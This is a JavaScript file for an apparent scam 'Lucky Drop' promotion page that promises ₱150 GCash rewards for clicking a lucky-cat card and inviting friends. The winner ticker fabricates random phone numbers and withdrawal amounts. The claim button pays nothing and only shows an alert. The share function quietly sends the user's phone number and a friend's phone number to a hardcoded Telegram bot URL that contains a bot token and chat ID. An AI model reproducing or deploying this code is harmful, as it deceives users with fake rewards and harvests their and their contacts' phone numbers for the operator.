// ========== PROMOTION.JS - SHARE AND EARN ==========

// ========== GLOBAL VARIABLES ==========
var youGetClicked = false;
var currentStep = 0;

// ========== MAIN TIMER (DROP ENDS IN - May 1, 2026) ==========
function initMainTimer() {
    var timerDisplay = document.getElementById('mainTimerDisplay');
    if (!timerDisplay) return;
    
    var target = new Date(2026, 4, 1, 0, 0, 0);
    
    function updateTimer() {
        var now = new Date();
        var diff = target - now;
        
        if (diff > 0) {
            var days = Math.floor(diff / (1000*60*60*24));
            var hours = Math.floor((diff % (86400000)) / 3600000);
            var mins = Math.floor((diff % 3600000) / 60000);
            var secs = Math.floor((diff % 60000) / 1000);
            timerDisplay.innerHTML = days + "D " + 
                hours.toString().padStart(2,'0') + ":" + 
                mins.toString().padStart(2,'0') + ":" + 
                secs.toString().padStart(2,'0');
        } else {
            timerDisplay.innerHTML = "00D 00:00:00";
        }
    }
    
    updateTimer();
    setInterval(updateTimer, 1000);
}

// ========== WINNER TICKER ==========
function initWinnerTicker() {
    var winnerSpan = document.getElementById('winnerText');
    if (!winnerSpan) return;
    
    var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
    var amounts = [150, 300, 450, 600, 750, 900, 1050, 1200];
    
    function generateRandomWinner() {
        var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        var last4 = Math.floor(1000 + Math.random() * 9000);
        var amount = amounts[Math.floor(Math.random() * amounts.length)];
        return prefix + "***" + last4 + ' withdrawn ₱' + amount;
    }
    
    winnerSpan.innerHTML = generateRandomWinner();
    setInterval(function() {
        winnerSpan.innerHTML = generateRandomWinner();
    }, 15000);
}

// ========== INDICATOR SYSTEM ==========
function updateIndicator(step) {
    var indicator1 = document.getElementById('indicator1');
    var indicator2 = document.getElementById('indicator2');
    var indicator3 = document.getElementById('indicator3');
    
    // Reset all indicators
    if (indicator1) {
        indicator1.classList.remove('indicator-yellow-red', 'indicator-hold');
        indicator1.style.background = 'rgba(255,255,255,0.2)';
    }
    if (indicator2) {
        indicator2.classList.remove('indicator-blue');
        indicator2.style.background = 'rgba(255,255,255,0.2)';
    }
    if (indicator3) {
        indicator3.classList.remove('indicator-green');
        indicator3.style.background = 'rgba(255,255,255,0.2)';
    }
    
    if (step === 0) {
        // Not clicked yet - NEON RED / NEON YELLOW (pulsing)
        if (indicator1) {
            indicator1.classList.add('indicator-yellow-red');
            indicator1.style.animation = 'pulseFade 1s infinite';
        }
    } else if (step === 1) {
        // Clicked - NEON YELLOW (solid glow)
        if (indicator1) {
            indicator1.classList.add('indicator-hold');
            indicator1.style.background = '#ffd700';
            indicator1.style.boxShadow = '0 0 15px #ffd700';
        }
    }
}

// ========== FLOATING +150 ANIMATION ==========
function showFloatingPlus(x, y) {
    var floatingDiv = document.createElement('div');
    floatingDiv.className = 'floating-plus';
    floatingDiv.innerHTML = '+₱150';
    floatingDiv.style.position = 'fixed';
    floatingDiv.style.left = x + 'px';
    floatingDiv.style.top = y + 'px';
    floatingDiv.style.color = '#ffd700';
    floatingDiv.style.fontSize = '32px';
    floatingDiv.style.fontWeight = 'bold';
    floatingDiv.style.fontFamily = 'Orbitron, monospace';
    floatingDiv.style.textShadow = '0 0 10px #ffaa33';
    floatingDiv.style.pointerEvents = 'none';
    floatingDiv.style.zIndex = '10001';
    floatingDiv.style.animation = 'floatUp 1s ease-out forwards';
    
    document.body.appendChild(floatingDiv);
    
    setTimeout(function() {
        floatingDiv.remove();
    }, 1000);
}

// ========== CONFETTI ==========
var confettiAnimation = null;
var confettiTimeout = null;

function startConfetti() {
    var canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    
    stopConfetti();
    
    canvas.style.display = 'block';
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    var ctx = canvas.getContext('2d');
    
    var particles = [];
    for (var i = 0; i < 100; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 6 + 2,
            color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
            speed: Math.random() * 3 + 2
        });
    }
    
    function draw() {
        if (!canvas || canvas.style.display === 'none') return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        for (var j = 0; j < particles.length; j++) {
            var p = particles[j];
            ctx.fillStyle = p.color;
            ctx.fillRect(p.x, p.y, p.size, p.size);
            p.y += p.speed;
            if (p.y > canvas.height) {
                p.y = -p.size;
                p.x = Math.random() * canvas.width;
            }
        }
        
        confettiAnimation = requestAnimationFrame(draw);
    }
    
    draw();
    
    if (confettiTimeout) clearTimeout(confettiTimeout);
    confettiTimeout = setTimeout(function() {
        stopConfetti();
    }, 3000);
}

function stopConfetti() {
    if (confettiAnimation) {
        cancelAnimationFrame(confettiAnimation);
        confettiAnimation = null;
    }
    var canvas = document.getElementById('confettiCanvas');
    if (canvas) {
        var ctx = canvas.getContext('2d');
        if (ctx) ctx.clearRect(0, 0, canvas.width, canvas.height);
        canvas.style.display = 'none';
    }
}

// ========== LUCKY CAT CARD EFFECTS ==========
function initLuckyCatCard() {
    var youGetCard = document.querySelector('.prize-card:first-child');
    if (!youGetCard) return;
    
    // Check if already clicked from localStorage
    var phone = localStorage.getItem("userPhone");
    var storageKey = "luckyCatClicked_" + phone;
    youGetClicked = localStorage.getItem(storageKey) === 'true';
    
    // Update indicator based on click status
    if (youGetClicked) {
        currentStep = 1;
        updateIndicator(1);
        youGetCard.style.border = '2px solid #ffd700';
        youGetCard.style.boxShadow = '0 0 15px rgba(255,215,0,0.5)';
        youGetCard.style.cursor = 'default';
    } else {
        currentStep = 0;
        updateIndicator(0);
        youGetCard.style.cursor = 'pointer';
        
        // Initial slight golden glow
        youGetCard.style.transition = 'all 0.3s ease';
        youGetCard.style.border = '1px solid rgba(255,215,0,0.3)';
        youGetCard.style.boxShadow = '0 0 5px rgba(255,215,0,0.2)';
        
        // Hover effect - sunray golden aura
        youGetCard.addEventListener('mouseenter', function() {
            if (!youGetClicked) {
                this.style.border = '2px solid #ffd700';
                this.style.boxShadow = '0 0 25px rgba(255,215,0,0.6), 0 0 10px rgba(255,215,0,0.4)';
                this.style.transform = 'scale(1.02)';
            }
        });
        
        youGetCard.addEventListener('mouseleave', function() {
            if (!youGetClicked) {
                this.style.border = '1px solid rgba(255,215,0,0.3)';
                this.style.boxShadow = '0 0 5px rgba(255,215,0,0.2)';
                this.style.transform = 'scale(1)';
            }
        });
        
        // Click event - no popup, just +150 effect
        youGetCard.addEventListener('click', function(e) {
            e.stopPropagation();
            
            if (youGetClicked) {
                alert("You already claimed your ₱150!");
                return;
            }
            
            // Get click position for floating animation
            var rect = this.getBoundingClientRect();
            var x = rect.left + rect.width / 2;
            var y = rect.top + rect.height / 2;
            
            // Mark as clicked
            youGetClicked = true;
            localStorage.setItem(storageKey, 'true');
            
            // Update UI
            this.style.border = '2px solid #ffd700';
            this.style.boxShadow = '0 0 15px rgba(255,215,0,0.5)';
            this.style.cursor = 'default';
            
            // Update indicator to 1/1 (NEON YELLOW)
            currentStep = 1;
            updateIndicator(1);
            
            // Show floating +150
            showFloatingPlus(x, y);
            
            // Start confetti
            startConfetti();
            
            // Update progress bar to 1/3
            var progressFill = document.getElementById('progressFill');
            if (progressFill) progressFill.style.width = '33%';
            
            // Update status message
            var statusMsg = document.getElementById('statusMessage');
            if (statusMsg) {
                statusMsg.innerHTML = '🎉 +₱150 added! Click CLAIM THRU GCASH to withdraw!';
            }
            
            console.log("Lucky Cat clicked! +₱150 added");
        });
    }
    
    console.log("Lucky cat card initialized - Clicked: " + youGetClicked);
}

// ========== FRIEND CARD (FRIEND GETS) ==========
function initFriendCard() {
    var friendCard = document.querySelector('.prize-card:last-child');
    if (!friendCard) return;
    
    // Simple hover effect for friend card
    friendCard.addEventListener('mouseenter', function() {
        this.style.border = '2px solid #ffd700';
        this.style.boxShadow = '0 0 20px rgba(255,215,0,0.4)';
        this.style.transform = 'scale(1.02)';
    });
    
    friendCard.addEventListener('mouseleave', function() {
        this.style.border = '1px solid rgba(255,215,0,0.2)';
        this.style.boxShadow = 'none';
        this.style.transform = 'scale(1)';
    });
    
    friendCard.addEventListener('click', function() {
        alert("📱 Share this link with your friend! They will get ₱150 too!");
    });
}

// ========== SHARE BUTTON ==========
function handleShare() {
    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
    var userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Please enter valid 11-digit number starting with 09");
        return;
    }
    
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    
    document.getElementById('friendPhoneInput').value = '';
    
    var progressFill = document.getElementById('progressFill');
    if (progressFill && !youGetClicked) progressFill.style.width = '33%';
    else if (progressFill && youGetClicked) progressFill.style.width = '66%';
    
    var statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = '✅ Friend invited! Share on Facebook to complete!';
    }
    
    var message = "REFERRAL INVITE!\nUser: " + userPhone + "\nFriend: " + friendPhone;
    fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message))
        .catch(function(e) { console.log("Telegram error:", e); });
    
    alert("Invitation sent to " + friendPhone);
}

function initShareButton() {
    var shareBtn = document.getElementById('shareButton');
    if (shareBtn) {
        var newShareBtn = shareBtn.cloneNode(true);
        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
        newShareBtn.onclick = handleShare;
    }
}

// ========== FACEBOOK SHARE ==========
function handleFacebookShare() {
    var shareUrl = "https://xjiligames.github.io/rewards/index.html";
    window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=400');
    
    var progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '100%';
    
    var statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = '✅ All steps completed! You can now claim!';
    }
}

function initFacebookShare() {
    var fbBtn = document.getElementById('shareFBBtn');
    if (fbBtn) {
        fbBtn.onclick = handleFacebookShare;
    }
}

// ========== CLAIM BUTTON ==========
function handleClaimGCash() {
    if (!youGetClicked) {
        alert("⚠️ Click the LUCKY CAT card first to get your ₱150!");
        return;
    }
    
    alert("💰 ₱150 claimed! Thank you for playing Lucky Drop!");
    
    var progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '100%';
    
    var statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = '✅ ₱150 claimed successfully!';
    }
}

function initClaimButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        claimBtn.onclick = handleClaimGCash;
    }
}

// ========== ENTER KEY SUPPORT ==========
function initEnterKeySupport() {
    var friendInput = document.getElementById('friendPhoneInput');
    var shareBtn = document.getElementById('shareButton');
    
    if (friendInput && shareBtn) {
        friendInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                shareBtn.click();
            }
        });
    }
}

// ========== VIDEO AUTOPLAY ==========
function initVideoAutoplay() {
    var video = document.querySelector('.lucky-cat-video video');
    if (video) {
        video.play().catch(function(e) {
            console.log("Autoplay blocked:", e);
        });
    }
}

// ========== DISPLAY USER PHONE ==========
function initUserDisplay() {
    var userPhone = localStorage.getItem("userPhone");
    var display = document.getElementById('userPhoneDisplay');
    if (display) {
        display.innerText = userPhone || 'Not logged in';
    }
    
    if (!userPhone) {
        alert("Please login first.");
        window.location.href = "index.html";
    }
}

// ========== NO POPUP - REMOVE X BUTTON FUNCTIONALITY ==========
// The prizePopup should NOT have an X button that causes issues
// Make sure the popup close only happens via outside click if needed

// ========== INITIALIZE ALL ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Promotion.js loading...");
    
    initUserDisplay();
    initMainTimer();
    initWinnerTicker();
    initLuckyCatCard();    // Main lucky cat with +150 effect
    initFriendCard();       // Friend card with share message
    initShareButton();
    initFacebookShare();
    initClaimButton();
    initEnterKeySupport();
    initVideoAutoplay();
    
    // Hide prizePopup completely - NO POPUP ON CARD CLICK
    var prizePopup = document.getElementById('prizePopup');
    if (prizePopup) {
        prizePopup.style.display = 'none';
    }
    
    console.log("Promotion.js ready - Lucky Cat ready to click!");
});